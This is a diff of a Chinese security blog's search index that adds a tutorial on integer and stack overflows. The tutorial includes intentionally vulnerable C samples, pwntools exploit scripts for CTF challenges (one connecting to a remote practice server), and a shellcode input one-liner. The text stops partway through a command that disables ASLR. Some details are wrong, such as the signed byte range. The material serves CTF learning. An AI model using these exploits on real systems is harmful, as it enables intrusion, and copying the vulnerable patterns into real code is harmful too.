@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>整数溢出（38）</title>
+      <link href="/2023/06/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-38-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
+      <url>/2023/06/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-38-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
+      
+        <content type="html"><![CDATA[<h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>首先来看看啥是整数溢出</p><p>整数溢出就是说:某一个整数的值大于了它原本定义空间的大小，就会发生溢出，它又重新从0开始计算大小。</p><p>比如1字节，最大是255</p><p>如果定义的是一个有符号数，则表示的值是-127~128</p><p>当定义某一个数超过128的时候，就会溢出，比如129其实就是-127</p><p>这里我们看一个代码更加的形象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> b = <span class="number">65537</span>;</span><br><span class="line"> <span class="keyword">if</span>(a == b)&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Int overflow successfully!\n&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601134908108.png" alt="image-20230601134908108"></p><p>可以看到这里a和b是相等的</p><p>这个是因为无符号数ungigned short int</p><p>范围是0~65535</p><p>当超过65535的时候就会 溢出，比如65536就是0。所以上面的65537==1</p><p>（这里其实再数学上叫同余式）</p><hr><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>现在基本懂了</p><p>来看看攻防世界的int_overflow</p><p>看到这个题目 看名字就知道是关于一个整数溢出的漏洞</p><p>首先用checksec看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601135712723.png" alt="image-20230601135712723"></p><p>是一个32位的，没有cancary和PIE的</p><p>这个感觉就比较容易了</p><p>用IDA打开看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601135911275.png" alt="image-20230601135911275"></p><p>老样子，首先看看这个字符串【shitf+f12】</p><p>发现由system 和 cat flag</p><p>还有一个Success</p><p>这里大概就是要利用的地方了</p><p>然后运行一下程序，看看main函数，主要的流程</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601140124614.png" alt="image-20230601140124614"></p><p>选择1继续【login函数】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601140152585.png" alt="image-20230601140152585"></p><p>这里的函数貌似都很安全</p><p>接着看看check_passed函数</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601140747708.png" alt="image-20230601140747708"></p><p>传入的buf 就是这个函数中的 s</p><p>看到有一个下面有一一个strcpy，字符串拷贝函数，这个函数一个不小心就溢出咯</p><p>这个dest的长度和s的长度差太大了吧，哈哈哈，这样肯定溢出了啊</p><p>首先垃圾字符填充这个dest 14h</p><p>然后看到<img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601141348674.png" alt="image-20230601141348674"></p><p>再ret 之前还有一个leave 指令，也就是说还需要把这个leave指令给覆盖掉才能进行ret</p><p>leave指令相当于：</p><p>mov esp,ebp和pop ebp</p><p>3+1 也就是4个字节的大小</p><p>所以我们真正需要填充的垃圾字符是14H+4H=18H[也就是24]</p><p>password需要的长度是3<del>8个字符，也可以是259</del>264个字符</p><p>那么我们想让返回地址到哪里去呢？</p><p>肯定是上面的system 和 cat flag 这里呗。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601141834761.png" alt="image-20230601141834761"></p><p>得知这个flag的地址是0x804868B</p><p>这里password取的是265个字符</p><p>最后的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">i = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">53752</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span> + p32(<span class="number">0x0804868B</span>) + <span class="string">b&quot;a&quot;</span>*<span class="number">235</span></span><br><span class="line"></span><br><span class="line">i.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">i.sendlineafter(<span class="string">&quot;your username:&quot;</span>,<span class="string">&quot;zzz&quot;</span>)</span><br><span class="line">i.sendline(payload)</span><br><span class="line">i.recv</span><br><span class="line">i.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230601144048919.png" alt="image-20230601144048919"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 二进制安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>冒泡排序</title>
       <link href="/2023/05/31/%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8%E7%AF%87-3-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/"/>
       <url>/2023/05/31/%E7%AE%97%E6%B3%95%E5%92%8C%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8%E7%AF%87-3-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/</url>
@@ -61,7 +80,7 @@
     
     
     <entry>
-      <title>逆向-格式化字符串(37)</title>
+      <title>格式化字符串(37)</title>
       <link href="/2023/05/31/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-37-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
       <url>/2023/05/31/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-37-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
       
@@ -70,7 +89,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -156,7 +175,7 @@
     
     
     <entry>
-      <title>逆向-ROP编程（36）</title>
+      <title>ROP编程（36）</title>
       <link href="/2023/05/30/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-36-ROP%E7%BC%96%E7%A8%8B/"/>
       <url>/2023/05/30/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-36-ROP%E7%BC%96%E7%A8%8B/</url>
       
@@ -165,7 +184,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -175,7 +194,7 @@
     
     
     <entry>
-      <title>逆向-堆溢出（35）</title>
+      <title>堆溢出（35）</title>
       <link href="/2023/05/29/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-35-%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
       <url>/2023/05/29/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-35-%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
       
@@ -184,7 +203,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -194,7 +213,7 @@
     
     
     <entry>
-      <title>逆向-栈溢出实战（34）</title>
+      <title>栈溢出实战（34）</title>
       <link href="/2023/05/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-34-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%98/"/>
       <url>/2023/05/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-34-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%98/</url>
       
@@ -203,7 +222,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -213,7 +232,7 @@
     
     
     <entry>
-      <title>逆向-保护机制（33）</title>
+      <title>保护机制（33）</title>
       <link href="/2023/05/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-33-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
       <url>/2023/05/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-33-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
       
@@ -222,7 +241,7 @@
       
       <categories>
           
-          <category> 二进制安全逆向 </category>
+          <category> 二进制安全 </category>
           
       </categories>
       
@@ -289,16 +308,16 @@
     
     
     <entry>
-      <title>逆向-二进制安全漏洞之缓冲区溢出（32）</title>
+      <title>二进制安全漏洞之缓冲区溢出（32）</title>
       <link href="/2023/05/26/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-32-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98/"/>
       <url>/2023/05/26/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-32-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98/</url>
       
-        <content type="html"><![CDATA[<h1 id="栈溢出漏洞基本原理"><a href="#栈溢出漏洞基本原理" class="headerlink" title="栈溢出漏洞基本原理"></a>栈溢出漏洞基本原理</h1><h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><p>栈溢出是缓冲区溢出的一种</p><p>缓冲区溢出是：一种长数据向小的缓冲区复制，导致数据超出了小缓冲区，导致其他的数据被破坏。这就是缓冲区溢出。</p><p><strong>手法</strong></p><p>1.先决条件，栈局部变量可控制，存在溢出（strcpy）</p><p>2.通过栈空间的布置，布置shellcode，并使用shellcode起始地址来覆盖栈帧的ret addr【返回地址】</p><p>3.Payload = [Nop sled + ] Shellcode + Pad + Shellcode’s Addr</p><p>但是：Shellcode地址在不同PC上不确定</p><p><strong>来看一个有问题的代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vul_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!(fp = fopen(<span class="string">&quot;input.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fread(buf,<span class="number">1024</span>,<span class="number">1</span>,fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data:%s\n&quot;</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    vul_func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fread时，指定的长度1024超过了buf尺寸。</p><p>输入数据长度可控，在input.txt中</p><p>可以精心操纵input.txt，对buf进行溢出布置shellcode、覆盖ret addr。</p><ol><li>确定栈帧布局，计算出buf到ret addr的offset【偏移地址】</li><li>先对buf填充无效数据，通过调试找出buf的首地址并覆盖ret addr。</li><li>用一段shellcode填充buf，这段shellcode会弹一个shell</li><li>IDA或者gdb找出buf距离ret addr的offset。</li><li>gdb找出buf起始的地址。</li><li>python –c ‘”A”<em>76+”B”</em>4+”\xdc\xee\xff\xbf”’ &gt; input.txt</li><li>替换”A”*76为shellcode+pads</li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p> pwnable.KR bof</p><p>【win10 虚拟机 2023.5.26-  bof】</p><p>这个是一个32位的lunix下的一个文件</p><p>可以用IDA的，但是这里我们用r2 ，复习和巩固一下基础的用法。</p><p>进去先用aaa简单分析一下啊</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526224439451.png" alt="image-20230526224439451"></p><p>这里看到了又mian函数，看看mian函数</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526224513452.png" alt="image-20230526224513452"></p><p>这里main函数call 了 这个 sym.func 这个函数</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526231828692.png" alt="image-20230526231828692"></p><p>首先看到下面这个  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp dword [arg_8h], 0xcafebabe</span><br></pre></td></tr></table></figure><p>这里就是比较的地方</p><p>起始这里用IDA中的F5看起来要直观一点【我觉得，我可能功力不够】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526231940738.png" alt="image-20230526231940738"></p><p>这里的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( a1 == 0xCAFEBABE )</span><br></pre></td></tr></table></figure><p>也就是上面的cmp</p><p>从r2中可以看到这个get(s)的空间是：0x2c 也就是44</p><p>但是IDA中 get(s)        char s[32]; // [esp+1Ch] [ebp-2Ch] BYREF</p><p>在IDA中看到是32 ， 它和r2中的44 大小不一样，why？</p><p>很明显，这里r2中看的是汇编，但是在IDA中看到的是伪代码，伪代码中间把指针存放的大小没有考虑进去，所以我们需要看的是汇编中的代码</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526232645012.png" alt="image-20230526232645012"></p><p>这样一来就是0x2c了</p><p>然后下面要比较的字符串，占用的空间是8，所以我们需要溢出的空间是44+8=52</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">44</span>+<span class="number">8</span>) + p64(<span class="number">0x0CAFEBABE</span>)</span><br><span class="line"><span class="comment">#b&#x27;a&#x27;*(44+8) 这个地方是需要溢出的空间的大小</span></span><br><span class="line"><span class="comment">#p64(0x0CAFEBABE) 这个是那个比较函数的地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526234150173.png" alt="image-20230526234150173"></p><p>【这里因为这个kali pwn 的环境一直搭不上…用的ubuntu】</p><p>官方payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwnable.kr&quot;,9000)</span></span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span></span><br><span class="line">payload+=p64(<span class="number">0xCAFEBABE</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="整数溢出的一本原理"><a href="#整数溢出的一本原理" class="headerlink" title="整数溢出的一本原理"></a>整数溢出的一本原理</h1><h2 id="基本知识-1"><a href="#基本知识-1" class="headerlink" title="基本知识"></a>基本知识</h2><p>如果一个整数用来计算一些铭感数值，比如：缓冲区大小或数值索引就会参数一些可能的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出发生之后，很难被立即察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出</p><p><strong>出现异常的三种情况</strong></p><ol><li><strong>溢出</strong>：整数溢出需要和有符号的数才会溢出有符号数的最高位表示符号，在2个正数或者负数相加的时候，有可能改变符号位的值，产生溢出。溢出标志OF可检测有符号数的溢出</li><li><strong>回绕</strong>：无符号数0-1的时候会变成最大的数字，比如1字节的无符号数会变成255，而255+1会变成最小数0。进位标志CF可检测无符号数的回绕</li><li><strong>截断</strong>：将一个较大宽度的数存入一个宽度小的操作数中，高位就会发生截断</li></ol><h3 id="有符号整数"><a href="#有符号整数" class="headerlink" title="有符号整数"></a>有符号整数</h3><p>这一类整数用于表示正值、负值和零，范围取决于为该类型分配的位数及其表示方式（原码、反码、补码)。当有符号数的运算结果不能用结果类型表示时就会发生溢出，可以分为上溢出和下溢出两种。</p><ul><li><strong>上溢出</strong>：往上的溢出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int i = 2147483647;</span><br><span class="line">i++;</span><br><span class="line"></span><br><span class="line">//i=-2147483648</span><br></pre></td></tr></table></figure><ul><li><strong>下溢出</strong>：往下的溢出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int i=-2147483648；</span><br><span class="line">i--;</span><br><span class="line"></span><br><span class="line">//i = 2147483647;</span><br></pre></td></tr></table></figure><h3 id="整数提升"><a href="#整数提升" class="headerlink" title="整数提升"></a>整数提升</h3><p>是指：当计算表达式中包含了不同宽度的操作数的时，较小宽度的操作数会被提升到和较大操作数一样的宽度，然后再进行计算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> l;</span><br><span class="line">    <span class="type">short</span> s;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    l = <span class="number">0xabcddcba</span>;</span><br><span class="line">    s = l;</span><br><span class="line">    c = l;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;宽度溢出\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;l = 0x%x (%d bits)\n&quot;</span>, l, <span class="keyword">sizeof</span>(l) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s = 0x%x (%d bits)\n&quot;</span>, s, <span class="keyword">sizeof</span>(s) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = 0x%x (%d bits)\n&quot;</span>, c, <span class="keyword">sizeof</span>(c) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整型提升\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s + c = 0x%x (%d bits)\n&quot;</span>, s+c, <span class="keyword">sizeof</span>(s+c) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="memcpy-函数"><a href="#memcpy-函数" class="headerlink" title="memcpy()函数"></a>memcpy()函数</h3><p>将src所指向的字符串中以src地址开始前n个字节复制到dest所指向的数组中，并且返回dest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">viod *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><h3 id="strncpy-函数"><a href="#strncpy-函数" class="headerlink" title="strncpy()函数"></a>strncpy()函数</h3><p>从源src所指的内存地址的起始位置开始复制n个字节到目标dest所指的内存地址的起始位置中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest , <span class="type">const</span> <span class="type">char</span> *src , <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><h3 id="整数转换"><a href="#整数转换" class="headerlink" title="整数转换"></a>整数转换</h3><p>如果攻击者给len赋予一个负数，则可以绕过if语句的检测，执行到memcpy()的时候，由于第三个参数是size_t类型，负数len会被转化为无符号整型，于是就变成了一个很大的正数。从而复制大量的内容到buf中，引发缓冲区溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> len = read_int_from_network();</span><br><span class="line">    <span class="type">char</span> *p = read_string_from_network();</span><br><span class="line">    <span class="keyword">if</span>(len&gt;<span class="number">80</span>)&#123;</span><br><span class="line">        error(<span class="string">&quot;length too large:bad god, no cookie for you&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,p,len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="回绕和溢出"><a href="#回绕和溢出" class="headerlink" title="回绕和溢出"></a>回绕和溢出</h3><p>当len过大的时候，len+5有可能发生回绕</p><p>比如，在x86-32上，如果len=0xFFFFFFFF，则len+5=0x00000004，这时malloc()只分配了4字节内存，然后在里面写入大量数据，就发生了缓冲区溢出。（如果将len声明为有符号int类型，len+5可能发生溢出）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">size_t</span> len;<span class="comment">//int len</span></span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    len = read_int_from_network();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(len+<span class="number">5</span>);</span><br><span class="line">    read(fd,buf,len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是因为malloc 这个函数和前面的int len 发生了思想上的错误所导致的错误。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527011321973.png" alt="image-20230527011321973"></p><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>这个例子接受两个字符串类型的参数并计算总长度，程序分配足够的内存来存储拼接后的字符串。首先将第一个字符串复制到缓冲区，然后将第二个字符串连接到尾部。此时如果攻击者提供的两个字符串总长度无法用total表示，就会发生截断，从而导致后面的缓冲区溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> total;</span><br><span class="line">    total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>])+<span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line">    strcopy(buf,argv[<span class="number">1</span>]);</span><br><span class="line">    strcopy(buf,argv[<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">validate_passwd</span><span class="params">(<span class="type">char</span> *passwd)</span> &#123;</span><br><span class="line"><span class="type">char</span> passwd_buf[<span class="number">11</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line"><span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good!\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(passwd_buf, passwd);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bad!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">validate_passwd(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个程序，strlen()返回类型是size_t，却被储存在无符号字符串类型中，任意超过无符号字符串最大上上线值【256】的数据都会导致截断异常。当密码长度是261的时候，截断后的值就变成5，成功绕过了if判断，导致栈溢出。获得shell</p><p>解：</p><p>首先关闭这个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; 